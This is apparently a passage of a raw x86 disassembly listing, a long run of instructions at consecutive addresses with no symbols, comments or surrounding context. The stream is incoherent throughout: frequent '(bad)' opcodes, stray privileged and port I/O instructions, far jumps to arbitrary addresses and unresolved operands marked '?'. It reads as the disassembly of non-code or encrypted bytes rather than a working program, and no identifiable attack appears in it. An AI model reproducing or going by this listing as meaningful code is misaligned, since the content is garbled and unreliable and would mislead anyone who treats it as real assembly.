  415daf:	sub    BYTE PTR [ebx+0x5c90d3ff],cl
  415db5:	push   es
  415db6:	stos   BYTE PTR es:[edi],al
  415db7:	cld    
  415db8:	mov    bl,0x97
  415dba:	jns    0x415dd9
  415dbc:	jnp    0x415db1
  415dbe:	inc    edi
  415dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dc0:	fwait
  415dc1:	inc    esi
  415dc2:	and    bl,BYTE PTR [edi]
  415dc4:	xchg   dl,dl
  415dc6:	and    BYTE PTR [esi-0x14],dl
  415dc9:	rcl    DWORD PTR [edi],cl
  415dcb:	jno    0x415e00
  415dcd:	add    DWORD PTR [ecx],esi
  415dcf:	out    0x90,eax
  415dd1:	std    
  415dd2:	dec    eax
  415dd3:	test   DWORD PTR [edi+edx*8+0x6f],ebp
  415dd7:	pop    esp
  415dd8:	fcom   QWORD PTR [esi]
  415dda:	out    0x0,al
  415ddc:	cmp    cl,cl
  415dde:	sub    dh,ch
  415de0:	push   eax
  415de1:	stc    
  415de2:	inc    esi
  415de3:	xchg   BYTE PTR [esi+edx*1+0x5fbe0a6b],dh
  415dea:	dec    ecx
  415deb:	cmp    dh,BYTE PTR [edx-0x15f5f635]
  415df1:	pminub mm3,QWORD PTR [esi-0xf]
  415df5:	mov    ss:0xba341e36,al
  415dfb:	in     eax,0xf4
  415dfd:	je     0x415da8
  415dff:	pop    ebp
  415e00:	test   DWORD PTR [ebp+0x13],eax
  415e03:	mov    eax,0x7b8cfddd
  415e08:	mov    bh,0x9c
  415e0a:	pop    eax
  415e0b:	jle    0x415e47
  415e0d:	inc    ecx
  415e0e:	lock in al,dx
  415e10:	shl    BYTE PTR [edx],0xb3
  415e13:	push   edx
  415e14:	xchg   BYTE PTR [ecx-0x39],al
  415e17:	dec    edi
  415e18:	test   eax,0x9924deda
  415e1d:	movaps xmm2,XMMWORD PTR [esp+esi*4-0x5f082bdd]
  415e25:	stos   BYTE PTR es:[edi],al
  415e26:	or     al,0xbb
  415e28:	jno    0x415ea1
  415e2a:	xchg   DWORD PTR [ecx+eax*4-0x57d84d67],edx
  415e31:	mov    DWORD PTR [edx-0x4a],eax
  415e34:	sar    DWORD PTR [esi+0x50fd40b7],cl
  415e3a:	nop
  415e3b:	stos   BYTE PTR es:[edi],al
  415e3c:	jl     0x415ea3
  415e3e:	push   0x46
  415e40:	inc    cl
  415e42:	adc    eax,0xe154a0a5
  415e47:	pop    edi
  415e48:	fsubr  QWORD PTR [esi-0x55456929]
  415e4e:	mov    ebx,0x5cb13508
  415e53:	jb     0x415ddf
  415e55:	scas   al,BYTE PTR es:[edi]
  415e56:	cld    
  415e57:	xchg   ecx,eax
  415e58:	and    eax,DWORD PTR [ebp+0x2d01c4ce]
  415e5e:	dec    BYTE PTR [eax+edx*4]
  415e61:	inc    eax
  415e62:	mov    bl,0x66
  415e64:	add    ch,bh
  415e66:	aad    0x1f
  415e68:	jl     0x415e58
  415e6a:	test   BYTE PTR [ecx+0x48],cl
  415e6d:	inc    ebx
  415e6e:	sar    al,cl
  415e70:	adc    eax,0xe3b44d64
  415e75:	stos   DWORD PTR es:[edi],eax
  415e76:	(bad)
  415e79:	rol    eax,cl
  415e7b:	xchg   esp,eax
  415e7c:	mov    ebp,0x56291566
  415e81:	push   edi
  415e82:	cmp    eax,ebp
  415e84:	xor    eax,0xc930765c
  415e89:	dec    ebp
  415e8a:	and    esp,DWORD PTR [edx+0x57]
  415e8d:	out    0x1d,eax
  415e8f:	leave  
  415e90:	and    al,0x3c
  415e92:	div    BYTE PTR [ebp+0x41dda50a]
  415e98:	fistp  QWORD PTR [ebp-0x2f]
  415e9b:	fiadd  WORD PTR [edx]
  415e9d:	cmp    eax,0x7f709957
  415ea2:	mov    dh,0x4
  415ea4:	xchg   ebp,eax
  415ea5:	enter  0x1aa7,0x7e
  415ea9:	pop    eax
  415eaa:	js     0x415ea2
  415eac:	sbb    al,0xcc
  415eae:	push   0xffffffec
  415eb0:	mov    edi,0x4dc77837
  415eb5:	mov    esi,0x98d5e992
  415eba:	jg     0x415f01
  415ebc:	and    DWORD PTR gs:[ecx-0x6296a389],ebp
  415ec3:	frstor [ecx+0x58]
  415ec6:	int    0x67
  415ec8:	sti    
  415ec9:	mov    esi,0x44f7dabf
  415ece:	pop    es
  415ecf:	cld    
  415ed0:	jp     0x415f4e
  415ed2:	scas   al,BYTE PTR es:[edi]
  415ed3:	pop    ss
  415ed4:	enter  0x29d3,0x97
  415ed8:	push   ss
  415ed9:	lds    esp,FWORD PTR [ecx-0x30]
  415edc:	mov    WORD PTR [ebp+esi*2-0x48c5e30a],ds
  415ee3:	mov    bl,0xd0
  415ee5:	ins    BYTE PTR es:[edi],dx
  415ee6:	imul   DWORD PTR [ecx]
  415ee8:	add    eax,0xd9c7a577
  415eed:	jmp    0x4a067a60
  415ef2:	cmp    BYTE PTR ds:0xd1f52b0b,dl
  415ef8:	pop    edi
  415ef9:	js     0x415f16
  415efb:	pop    ds
  415efc:	inc    esp
  415efd:	cmp    ecx,DWORD PTR [ebp-0x46]
  415f00:	fld    DWORD PTR [edi]
  415f02:	sub    al,0x18
  415f04:	xor    eax,0x2635a765
  415f09:	xchg   esi,eax
  415f0a:	sub    al,BYTE PTR [edi+0x3f]
  415f0d:	mov    al,ds:0x474ff7a0
  415f12:	in     eax,0x8c
  415f14:	push   ebp
  415f15:	rcl    DWORD PTR [edx],1
  415f17:	int    0x40
  415f19:	imul   ebp,DWORD PTR [eax+0x7a70ab29],0x770c137a
  415f23:	pusha  
  415f24:	(bad)  
  415f26:	lea    ecx,[eax-0x72427541]
  415f2c:	xchg   esi,eax
  415f2d:	mov    WORD PTR [ebp-0x2db7d725],ss
  415f33:	mov    DWORD PTR [esi],ecx
  415f35:	sub    dl,BYTE PTR [ecx+edx*4-0x7b0256c9]
  415f3c:	out    0x4b,eax
  415f3e:	fcom   QWORD PTR [eax-0x61]
  415f41:	(bad)  
  415f42:	sub    al,0x19
  415f44:	outs   dx,DWORD PTR ds:[esi]
  415f45:	cmp    cl,BYTE PTR [ecx-0x7]
  415f48:	inc    edi
  415f49:	loop   0x415f92
  415f4b:	jnp    0x415fac
  415f4d:	mov    DWORD PTR [esi-0x3e],edx
  415f50:	jnp    0x415f03
  415f52:	push   esp
  415f53:	ja     0x415f5e
  415f55:	(bad)  
  415f57:	out    dx,al
  415f58:	mov    cl,0x34
  415f5a:	es lahf 
  415f5c:	mov    ebx,0x3ed583d8
  415f61:	and    BYTE PTR [esi-0x29],bh
  415f64:	sbb    al,0x9d
  415f66:	dec    eax
  415f67:	pusha  
  415f68:	add    eax,0x7ac69f72
  415f6d:	push   ss
  415f6e:	mov    eax,DWORD PTR [ecx-0x39]
  415f71:	add    BYTE PTR [ebp-0x3ceac0a1],0x3d
  415f78:	aam    0xa6
  415f7a:	adc    DWORD PTR [edx-0x73],0xc55f4da7
  415f81:	xor    eax,DWORD PTR [edx]
  415f83:	js     0x415f2a
  415f85:	xor    esi,DWORD PTR [esi-0x2b4cf4ad]
  415f8b:	loope  0x415fde
  415f8d:	fs jne 0x416004
  415f90:	inc    eax
  415f91:	fild   QWORD PTR [edx]
  415f93:	jb     0x415fa5
  415f95:	or     dx,WORD PTR [ebx+0x7f322b4]
  415f9c:	xor    BYTE PTR [esp+ebx*1],0xc8
  415fa0:	jbe    0x415f61
  415fa2:	into   
  415fa3:	adc    BYTE PTR [ecx],cl
  415fa5:	(bad)  
  415fa7:	jl     0x415f51
  415fa9:	call   ecx
  415fab:	cli    
  415fac:	xor    eax,esp
  415fae:	fstp   st(1)
  415fb0:	add    edx,esp
  415fb2:	pop    ebp
  415fb3:	cld    
  415fb4:	cmp    al,0xa4
  415fb6:	imul   edi,DWORD PTR [eax],0x4d591d54
  415fbc:	addr16 ja 0x415f61
  415fbf:	cmp    bl,dl
  415fc1:	push   ebx
  415fc2:	mov    bl,0x12
  415fc4:	add    edx,DWORD PTR [edx+ebp*8+0x1b]
  415fc8:	inc    ecx
  415fc9:	mov    ebx,0xe060ce25
  415fce:	mov    DWORD PTR [esi+0x77d9eed0],edi
  415fd4:	sub    DWORD PTR [esi],esp
  415fd6:	fisttp WORD PTR [edx]
  415fd8:	shr    BYTE PTR [edi+edi*4-0x5b],cl
  415fdc:	and    ecx,esp
  415fde:	cmp    eax,0xf653eeb4
  415fe3:	mov    ah,0x19
  415fe5:	and    al,0xd1
  415fe7:	nop
  415fe8:	iret   
  415fe9:	mov    ah,BYTE PTR [ecx-0x213ea249]
  415fef:	cmc    
  415ff0:	ins    BYTE PTR es:[edi],dx
  415ff1:	sub    BYTE PTR [esi+edx*1],bh
  415ff4:	or     al,0x91
  415ff6:	or     eax,0xa828428e
  415ffb:	into   
  415ffc:	xchg   edx,eax
  415ffd:	sbb    al,BYTE PTR [edx+eax*1]
  416000:	ins    DWORD PTR es:[edi],dx
  416001:	inc    ebp
  416002:	retf   
  416003:	fild   WORD PTR [ebx]
  416005:	fnstcw WORD PTR [edx+0x7e]
  416008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416009:	jecxz  0x415fd5
  41600b:	mov    ?,WORD PTR [ebx+0x454e319e]
  416011:	pop    ecx
  416012:	test   ah,0x7
  416015:	das    
  416016:	xchg   esi,eax
  416017:	int3   
  416018:	les    edi,FWORD PTR [esi]
  41601a:	nop
  41601b:	inc    eax
  41601c:	data16 not BYTE PTR [esi+0x27]
  416020:	nop
  416021:	or     BYTE PTR [eax-0x2ac6e743],bl
  416027:	mov    edx,0x316ffa79
  41602c:	push   ebp
  41602d:	cmp    DWORD PTR [edx],0x30f17d9f
  416033:	aaa    
  416034:	xchg   esi,eax
  416035:	push   esi
  416036:	adc    bl,ch
  416038:	call   0xbafd5315
  41603d:	xor    ah,BYTE PTR [edi+0x6b1a1fcc]
  416043:	jle    0x4160ae
  416045:	dec    eax
  416046:	or     eax,0x4e2c65cd
  41604b:	inc    esi
  41604c:	push   es
  41604d:	add    eax,0x356de339
  416052:	push   ds
  416053:	mov    ds:0xfd7794fd,al
  416058:	inc    ebx
  416059:	pop    ds
  41605a:	js     0x41608c
  41605c:	add    bl,BYTE PTR [edx+eax*2]
  41605f:	icebp  
  416060:	shl    dl,1
  416062:	inc    edi
  416063:	and    bl,BYTE PTR ds:0xfe6f9bc8
  416069:	out    0x89,eax
  41606b:	mov    dh,0x84
  41606d:	adc    DWORD PTR [edi-0x2f8411a7],ebp
  416073:	call   0x1cca:0x285f2800
  41607a:	push   es
  41607b:	aaa    
  41607c:	addr16 xchg ch,ah
  41607f:	mov    ebp,0x5310c7b8
  416084:	pop    ebx
  416085:	dec    esp
  416086:	mov    edx,0xb0db9651
  41608b:	repz arpl WORD PTR ds:0x1ed91d6b,si
  416092:	or     bl,bh
  416094:	jo     0x4160c9
  416096:	js     0x416062
  416098:	sub    dl,BYTE PTR [esi]
  41609a:	popf   
  41609b:	mov    ecx,0x64d6880e
  4160a0:	add    BYTE PTR [edi+0x7d392c40],al
  4160a6:	arpl   si,ax
  4160a8:	jmp    0x4160cd
  4160aa:	out    dx,al
  4160ab:	dec    eax
  4160ac:	push   eax
  4160ad:	push   esp
  4160ae:	jl     0x4160d5
  4160b0:	inc    ebx
  4160b1:	mov    ds:0xace488cb,eax
  4160b6:	mov    bl,0xb4
  4160b8:	aaa    
  4160b9:	or     al,0x2d
  4160bb:	dec    edi
  4160bc:	and    edx,DWORD PTR [esp+eax*4]
  4160bf:	enter  0x8ea7,0x56
  4160c3:	add    BYTE PTR [eax+ecx*4],dl
  4160c6:	call   0x1e27eae3
  4160cb:	test   BYTE PTR [eax],bh
  4160cd:	mov    bl,0x33
  4160cf:	cli    
  4160d0:	add    al,0x59
  4160d2:	sub    al,0xac
  4160d4:	stc    
  4160d5:	mov    ch,0x26
  4160d7:	or     ch,dl
  4160d9:	call   0x41aebd52
  4160de:	inc    eax
  4160df:	push   ds
  4160e0:	std    
  4160e1:	mov    ah,0xa0
  4160e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160e4:	mov    al,0x2d
  4160e6:	lock xchg BYTE PTR [eax+ecx*4],al
  4160ea:	cdq    
  4160eb:	push   edi
  4160ec:	loope  0x4160ca
  4160ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160ef:	push   eax
  4160f0:	lods   al,BYTE PTR ds:[esi]
  4160f1:	xchg   esp,eax
  4160f2:	or     al,0x32
  4160f4:	adc    DWORD PTR [eax],eax
  4160f6:	js     0x416166
  4160f8:	iret   
  4160f9:	fwait
  4160fa:	jns    0x41614b
  4160fc:	cvtdq2ps xmm1,XMMWORD PTR [edi]
  4160ff:	scas   al,BYTE PTR es:[edi]
  416100:	cwde   
  416101:	push   eax
  416102:	(bad)  
  416103:	xchg   edi,eax
  416104:	jp     0x41608f
  416106:	mov    ch,0xdb
  416108:	adc    eax,0x95723473
  41610d:	jns    0x4160c2
  41610f:	and    ah,BYTE PTR [ebx+0x43c41759]
  416115:	out    dx,eax
  416116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416117:	cdq    
  416118:	push   ds
  416119:	pop    ebx
  41611a:	mov    ss,WORD PTR ds:0xae08e848
  416120:	arpl   bx,ax
  416122:	xlat   BYTE PTR ds:[ebx]
  416123:	lods   eax,DWORD PTR ds:[esi]
  416124:	sahf   
  416125:	sbb    cl,al
  416127:	fnstsw WORD PTR [eax-0x38]
  41612a:	mov    edi,0x54757792
  41612f:	pop    eax
  416130:	scas   al,BYTE PTR es:[edi]
  416131:	pop    ecx
  416132:	push   ebx
  416133:	cld    
  416134:	or     al,0x61
  416136:	push   0x11
  416138:	or     BYTE PTR [eax+0x24b25a67],bl
  41613e:	lahf   
  41613f:	xor    al,BYTE PTR [eax]
  416141:	and    eax,0xc40ef1e1
  416146:	int3   
  416147:	and    dl,BYTE PTR ds:0x4dcf9751
  41614d:	mov    cl,BYTE PTR [edx]
  41614f:	adc    al,0xad
  416151:	and    al,0x38
  416153:	mov    bh,0xb4
  416155:	sub    al,0x6a
  416157:	add    edi,ebx
  416159:	push   ecx
  41615a:	aam    0x89
  41615c:	stos   BYTE PTR es:[edi],al
  41615d:	adc    dl,BYTE PTR [ebx+esi*4]
  416160:	dec    eax
  416161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416162:	adc    dh,BYTE PTR [ebp-0x426cc1b7]
  416168:	pop    ds
  416169:	paddsb mm1,QWORD PTR [edx-0x10ad09c9]
  416170:	clc    
  416171:	mov    edx,0x174be577
  416176:	fild   WORD PTR [ebp+ebp*4+0x1a12c7a5]
  41617d:	cmp    DWORD PTR [ebx+0xd],eax
  416180:	sahf   
  416181:	adc    eax,0xd7315c7f
  416186:	je     0x4161da
  416188:	push   ebp
  416189:	sbb    BYTE PTR [edi+0x173eb4d3],al
  41618f:	imul   edx,DWORD PTR [si-0x39fe],0x7a
  416195:	mov    bl,0x19
  416197:	mov    al,BYTE PTR [eax]
  416199:	add    DWORD PTR [eax],ebp
  41619b:	out    dx,al
  41619c:	adc    bh,BYTE PTR [ebx]
  41619e:	call   0x1fbd824d
  4161a3:	xchg   ecx,esp
  4161a5:	xor    bh,dh
  4161a7:	and    edx,DWORD PTR [ebx+0x4308da52]
  4161ad:	mov    ch,0x5
  4161af:	outs   dx,DWORD PTR ds:[esi]
  4161b0:	xchg   ebp,eax
  4161b1:	popa   
  4161b2:	xchg   edi,eax
  4161b3:	dec    edx
  4161b4:	inc    eax
  4161b5:	imul   esi,DWORD PTR [edi+0x42ee0e3b],0xefcc0770
  4161bf:	pop    ecx
  4161c0:	(bad)  
  4161c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161c2:	fimul  DWORD PTR [edx+0x1d]
  4161c5:	push   0xbd7547cd
  4161ca:	ret    0xeb25
  4161cd:	cmp    dh,ch
  4161cf:	fs hlt 
  4161d1:	pop    esp
  4161d2:	sbb    dh,BYTE PTR [esi-0x49]
  4161d5:	mov    edx,0x52535c8c
  4161da:	xor    al,0xda
  4161dc:	adc    bh,BYTE PTR [eax+0x34]
  4161df:	xchg   BYTE PTR [esp+edi*2+0x668890f3],bl
  4161e6:	jg     0x4161f0
  4161e8:	bound  esp,QWORD PTR [edi-0x594031ea]
  4161ee:	pop    eax
  4161ef:	retf   
  4161f0:	retf   
  4161f1:	and    BYTE PTR [ecx-0x6edce722],dl
  4161f7:	mov    eax,ds:0xd2590cef
  4161fc:	push   0xffffffb5
  4161fe:	sbb    dl,ch
  416200:	neg    BYTE PTR [edx+0x44]
  416203:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  416205:	or     al,0x6e
  416207:	push   0x11cbc924
  41620c:	mov    esi,0x90c8bfbf
  416211:	add    al,0xdb
  416213:	ss xchg esp,eax
  416215:	(bad)
  416218:	mov    al,0x25
  41621a:	pop    edx
  41621b:	ins    DWORD PTR es:[edi],dx
  41621c:	popf   
  41621d:	aaa    
  41621e:	ins    BYTE PTR es:[edi],dx
  41621f:	or     BYTE PTR [ecx-0x570f84b8],dh
  416225:	pusha  
  416226:	adc    ch,dh
  416228:	or     al,0xd2
  41622a:	or     edi,DWORD PTR [edx-0x7]
  41622d:	scas   eax,DWORD PTR es:[edi]
  41622e:	(bad)  
  41622f:	shr    BYTE PTR [esi],cl
  416231:	xchg   BYTE PTR [ebx-0x4f],bl
  416234:	mov    ah,0xb8
  416236:	or     ch,ch
  416238:	mov    al,0x5c
  41623a:	push   0x12bc373
  41623f:	and    bl,BYTE PTR [eax+0x4d4e7bb]
  416245:	mov    al,ds:0x3590d3c5
  41624a:	cwde   
  41624b:	shl    bl,0x6f
  41624e:	cwde   
  41624f:	push   es
  416250:	mov    ebx,0x3c8bd2f0
  416255:	(bad)  
  416256:	in     eax,0xd9
  416258:	mov    ecx,tr4
  41625b:	adc    al,0x7f
  41625d:	add    bl,BYTE PTR [ebx+0x33]
  416260:	adc    ah,BYTE PTR [ebx-0x45]
  416263:	mov    dh,0x68
  416265:	mov    ds,WORD PTR [ebp+eax*4-0x39ada4f0]
  41626c:	jae    0x416257
  41626e:	mov    ebx,0x56a6748f
  416273:	fs retf 0x54f7
  416277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416278:	add    eax,0xd5e7bf4
  41627d:	fstp   QWORD PTR [esi-0x78]
  416280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416281:	xor    al,0x96
  416283:	ror    BYTE PTR [ebx+0x48bca98],cl
  416289:	mov    BYTE PTR [esi+0x52bae7f3],ah
  41628f:	call   0xc5a0e29
  416294:	repnz dec edi
  416296:	and    ah,ah
  416298:	outs   dx,DWORD PTR ds:[esi]
  416299:	out    dx,eax
  41629a:	ins    BYTE PTR es:[edi],dx
  41629b:	cmp    BYTE PTR [esi],al
  41629d:	ret    
  41629e:	sub    BYTE PTR [eax-0x7a],dl
  4162a1:	(bad)  
  4162a2:	fidiv  WORD PTR ds:0x484a02b9
  4162a8:	cdq    
  4162a9:	mov    ds,WORD PTR [ecx+0x611c7169]
  4162af:	push   ebx
  4162b0:	mov    eax,ds:0x79b4bc3d
  4162b5:	xchg   esi,eax
  4162b6:	jecxz  0x4162e5
  4162b8:	mov    bh,0x17
  4162ba:	pop    eax
  4162bb:	or     DWORD PTR [ecx-0x4f],0xffffffaa
  4162bf:	sub    DWORD PTR [edx-0x75502aa3],esi
  4162c5:	mov    ds:0x6219828,eax
  4162ca:	inc    edx
  4162cb:	jecxz  0x4162a1
  4162cd:	pop    eax
  4162ce:	in     eax,0xe4
  4162d0:	popf   
  4162d1:	jge    0x4162ed
  4162d3:	les    eax,FWORD PTR [esi-0x6e]
  4162d6:	stos   BYTE PTR es:[edi],al
  4162d7:	fisubr WORD PTR [eax-0x22]
  4162da:	loopne 0x41626a
  4162dc:	(bad)  
  4162dd:	mov    edx,0x99bf05ce
  4162e2:	bound  eax,QWORD PTR [edi-0x25fe890c]
  4162e8:	adc    eax,edx
  4162ea:	sahf   
  4162eb:	ins    BYTE PTR es:[edi],dx
  4162ec:	or     cl,BYTE PTR [edx]
  4162ee:	cwde   
  4162ef:	xor    ecx,0xf0bd665d
  4162f5:	inc    edx
  4162f6:	sub    eax,DWORD PTR [ebx]
  4162f8:	jb     0x416349
  4162fa:	sbb    eax,0xb3b3aee6
  4162ff:	mov    al,0x27
  416301:	jmp    0x743a:0x192a897
  416308:	loopne 0x4162ea
  41630a:	dec    esp
  41630b:	aas    
  41630c:	lds    ebp,FWORD PTR [ebx]
  41630e:	test   BYTE PTR [edx],bl
  416310:	inc    BYTE PTR [esi+0x7]
  416313:	or     esp,DWORD PTR [ebx+0x60e89e48]
  416319:	xchg   edi,eax
  41631a:	loop   0x41633b
  41631c:	cdq    
  41631d:	rdpmc  
  41631f:	mov    cl,0x5e
  416321:	mov    ebp,0x45d0f984
  416326:	inc    ebp
  416327:	mov    eax,0x51f8c89a
  41632c:	repnz inc esi
  41632e:	fsqrt  
  416330:	ins    DWORD PTR es:[edi],dx
  416331:	pop    eax
  416332:	loop   0x416356
  416334:	jnp    0x41639b
  416336:	sub    al,0x67
  416338:	fld    TBYTE PTR [ecx]
  41633a:	push   edi
  41633b:	mov    ebp,0x669b8a7d
  416340:	mov    edx,0x3fab0431
  416345:	add    al,0xb1
  416347:	shl    DWORD PTR [eax-0x68],1
  41634a:	shr    ebp,cl
  41634c:	(bad)  
  41634e:	pop    es
  41634f:	push   0x8dffc2f1
  416354:	test   eax,0xee15ab8d
  416359:	dec    ecx
  41635a:	loope  0x41638f
  41635c:	out    0xdc,eax
  41635e:	cmc    
  41635f:	ja     0x416300
  416361:	jno    0x41638f
  416363:	xchg   ebx,eax
  416364:	ins    BYTE PTR es:[edi],dx
  416365:	push   es
  416366:	xchg   ebx,eax
  416367:	(bad)  
  416369:	(bad)  
  41636a:	std    
  41636b:	into   
  41636c:	add    BYTE PTR [ebp+0x1],cl
  41636f:	cmp    edi,DWORD PTR [esp+eiz*8+0x3f]
  416373:	sub    esp,DWORD PTR [edx]
  416375:	push   0xffffffcd
  416377:	mov    esp,0x31fa3581
  41637c:	int3   
  41637d:	push   ds
  41637e:	inc    eax
  41637f:	cmp    DWORD PTR ds:0xfbe96d08,ebx
  416385:	out    0xc0,eax
  416387:	jne    0x41639a
  416389:	sbb    esp,DWORD PTR [ebp-0x28218ddf]
  41638f:	sub    ecx,esp
  416391:	cmp    bl,BYTE PTR [ebp-0x2009e70d]
  416397:	inc    esi
  416398:	outs   dx,BYTE PTR ds:[esi]
  416399:	fs mov dh,0x88
  41639c:	icebp  
  41639d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41639e:	mov    BYTE PTR [edx],dh
  4163a0:	sti    
  4163a1:	or     eax,0x73eebd0f
  4163a6:	inc    ebx
  4163a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163a8:	mov    ch,0x3b
  4163aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163ab:	rcr    ecx,1
  4163ad:	mov    WORD PTR ds:0x4567adea,?
  4163b3:	pop    ebp
  4163b4:	mov    al,0x3d
  4163b6:	xor    eax,0x18551bc7
  4163bb:	jl     0x4163d8
  4163bd:	push   es
  4163be:	push   esi
  4163bf:	xchg   ebp,eax
  4163c0:	popf   
  4163c1:	test   BYTE PTR [esi+0x4e112299],dh
  4163c7:	jmp    0x416425
  4163c9:	xor    ah,BYTE PTR [eax+0xc]
  4163cc:	mov    ecx,0x506c3647
  4163d1:	jp     0x416416
  4163d3:	sub    BYTE PTR [ecx+0x57bace1c],dl
  4163d9:	or     ah,BYTE PTR [esi+ebp*8-0x6c]
  4163dd:	mov    eax,0xf9e2004d
  4163e2:	cld    
  4163e3:	leave  
  4163e4:	mov    eax,DWORD PTR [edi+ebx*2+0x70]
  4163e8:	fsqrt  
  4163ea:	inc    edi
  4163eb:	cmp    cl,cl
  4163ed:	cmp    ebp,ebp
  4163ef:	mov    dl,0x5d
  4163f1:	mov    ebx,0xb56b67b4
  4163f6:	add    DWORD PTR [ebp-0x4c89588e],esi
  4163fc:	cmp    al,0xff
  4163fe:	mov    WORD PTR [ecx+0x53],?
  416401:	aam    0xe
  416403:	scas   eax,DWORD PTR es:[edi]
  416404:	call   0x7292:0x7468e2ac
  41640b:	data16 and ch,al
  41640e:	cmc    
  41640f:	out    dx,al
  416410:	xor    edi,DWORD PTR [edx+0x67919dad]
  416416:	rol    DWORD PTR [ecx+0x7c563649],cl
  41641c:	test   al,0x24
  41641e:	mov    dh,dl
  416420:	daa    
  416421:	ror    DWORD PTR [edx+0x3cfa001e],0xc7
  416428:	xchg   ebp,eax
  416429:	xor    al,0xa5
  41642b:	std    
  41642c:	push   ecx
  41642d:	mov    al,0x38
  41642f:	ss in  al,dx
  416431:	test   al,0x6c
  416433:	adc    dl,ah
  416435:	mov    esi,0xd36addd1
  41643a:	and    esi,DWORD PTR [eax-0x61]
  41643d:	bnd call 0xdc959f72
  416443:	sub    BYTE PTR [ecx+0x22],dh
  416446:	mov    edx,0x143eb917
  41644b:	inc    edi
  41644c:	out    dx,eax
  41644d:	jge    0x41643c
  41644f:	xor    al,0xd0
  416451:	push   esi
  416452:	cmp    esp,DWORD PTR [esi-0x4]
  416455:	dec    ebx
  416456:	fcmovbe st,st(2)
  416458:	xchg   BYTE PTR [ebx-0x6d6c8387],ah
  41645e:	inc    eax
  41645f:	ss xchg esp,eax
  416461:	adc    al,BYTE PTR [edi-0x6e81e7ad]
  416467:	call   0x48d9:0xc33a63d4
  41646e:	xchg   ebx,eax
  41646f:	mov    ebp,0x2d28823e
  416474:	and    DWORD PTR [esi+0x20],esp
  416477:	push   0x3f71154
  41647c:	ror    BYTE PTR [eax+0x6f],1
  41647f:	test   ebx,ebx
  416481:	pushf  
  416482:	rol    edi,0xd1
  416485:	scas   eax,DWORD PTR es:[edi]
  416486:	sub    BYTE PTR [edx+0x4563ae42],ah
  41648c:	sbb    esi,DWORD PTR [esi+eax*4+0x12]
  416490:	jbe    0x416457
  416492:	add    cl,BYTE PTR [esi-0x52]
  416495:	cmc    
  416496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416497:	jg     0x416513
  416499:	add    esp,DWORD PTR cs:[edx+ebx*2]
  41649d:	cs (bad) 
  4164a0:	sbb    DWORD PTR [eax+0x38],edi
  4164a3:	jno    0x41649d
  4164a5:	push   ebp
  4164a6:	mov    ds:0xda184630,eax
  4164ab:	cld    
  4164ac:	ret    0xc303
  4164af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164b0:	js     0x41648f
  4164b2:	(bad)  
  4164b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164b4:	and    BYTE PTR [ebx-0x26cf800e],ch
  4164ba:	pop    ds
  4164bb:	cli    
  4164bc:	mov    WORD PTR [ecx],?
  4164be:	jl     0x4164f2
  4164c0:	sahf   
  4164c1:	ins    DWORD PTR es:[edi],dx
  4164c2:	dec    ecx
  4164c3:	repz push ebx
  4164c5:	sbb    esi,ebp
  4164c7:	add    edi,DWORD PTR [esi+0x63c36563]
  4164cd:	mov    ebx,0xada1559e
  4164d2:	cmp    al,dl
  4164d4:	pop    eax
  4164d5:	(bad)  
  4164d6:	fild   DWORD PTR [esi-0x27]
  4164d9:	shl    BYTE PTR [edx-0x39],cl
  4164dc:	ret    0x602a
  4164df:	xchg   edi,eax
  4164e0:	ret    0xdb53
  4164e3:	bnd jge 0x4164f6
  4164e6:	xor    ch,BYTE PTR [ecx+0x41a3d9ee]
  4164ec:	mov    DWORD PTR [ebx+0x38],esi
  4164ef:	loopne 0x41648f
  4164f1:	and    BYTE PTR [ebx-0x2e03d3e9],0xad
  4164f8:	xor    DWORD PTR [esi],esi
  4164fa:	les    eax,FWORD PTR [edx-0x1c]
  4164fd:	push   ecx
  4164fe:	aaa    
  4164ff:	mov    gs,ecx
  416501:	mov    dl,0x31
  416503:	push   ecx
  416504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416505:	xor    BYTE PTR [eax+0x12],dh
  416508:	mov    cs,ecx
  41650a:	add    al,0x66
  41650c:	aam    0x14
  41650e:	ins    DWORD PTR es:[edi],dx
  41650f:	enter  0x8b9a,0xb
  416513:	ins    DWORD PTR es:[edi],dx
  416514:	hlt    
  416515:	sub    dh,BYTE PTR [ebx+0x57]
  416518:	pop    edi
  416519:	lods   al,BYTE PTR ds:[esi]
  41651a:	sahf   
  41651b:	aam    0xea
  41651d:	loope  0x416526
  41651f:	cmp    eax,0x21a1b4ca
  416524:	enter  0x81c2,0x11
  416528:	sub    bh,bh
  41652a:	lods   al,BYTE PTR ds:[esi]
  41652b:	mov    edi,0x5fd627ba
  416530:	inc    eax
  416531:	sbb    DWORD PTR [edi],ebx
  416533:	mov    ebx,0x66630e19
  416538:	and    edx,DWORD PTR [edx+0x42a1a421]
  41653e:	dec    edi
  41653f:	inc    edi
  416540:	pavgb  mm0,QWORD PTR [eax]
  416543:	imul   eax,DWORD PTR [ecx-0x54],0xfffffff1
  416547:	jne    0x416508
  416549:	mov    ebp,0x39560c62
  41654e:	loopne 0x4164e3
  416550:	test   bh,0xce
  416553:	pop    eax
  416554:	fisttp DWORD PTR ds:0x71507a59
  41655a:	ins    DWORD PTR es:[edi],dx
  41655b:	loope  0x4165c8
  41655d:	jl     0x4165d8
  41655f:	sbb    al,0x85
  416561:	aam    0x31
  416563:	sub    ch,BYTE PTR [edx-0x4d671bd6]
  416569:	sahf   
  41656a:	aaa    
  41656b:	or     eax,0xdfcf697f
  416570:	ret    0xd8f8
  416573:	ret    
  416574:	pop    ebx
  416575:	add    BYTE PTR [esi-0x51676ae2],al
  41657b:	sub    eax,0x3ec834a0
